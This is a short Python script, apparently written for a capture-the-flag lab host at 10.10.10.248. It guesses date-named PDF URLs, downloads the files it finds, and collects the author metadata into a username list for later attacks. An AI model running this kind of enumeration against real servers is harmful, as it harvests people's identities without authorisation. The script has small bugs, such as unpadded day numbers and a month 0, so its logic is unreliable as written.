import requests
from pypdf import PdfReader
m = 1
users = []
def scan():
	for n in range(1,32):
		if m >9:
			url = f"http://10.10.10.248/documents/2020-{m}-{n}-upload.pdf"
		else:
			url = f"http://10.10.10.248/documents/2020-0{m}-{n}-upload.pdf"
		response = requests.get(url)
		if response.status_code == 200:
			print('PDF File Found, check it out!')
			print(url)
			print('---------------------------------------------------')
			with open(f'file_{m}_{n}.pdf',"wb") as pdf_file:
				pdf_file.write(response.content)
				reader = PdfReader(f'file_{m}_{n}.pdf')
				meta = reader.metadata
				users.append(meta.creator)
		else:
			continue
for m in range (13):
	scan()

unique_users = set(users)
unique_users_list= list(unique_users)
with open('users.txt','w') as f:
	for unique_user in unique_users_list:
		f.write(unique_user+"\n")
	f.close()

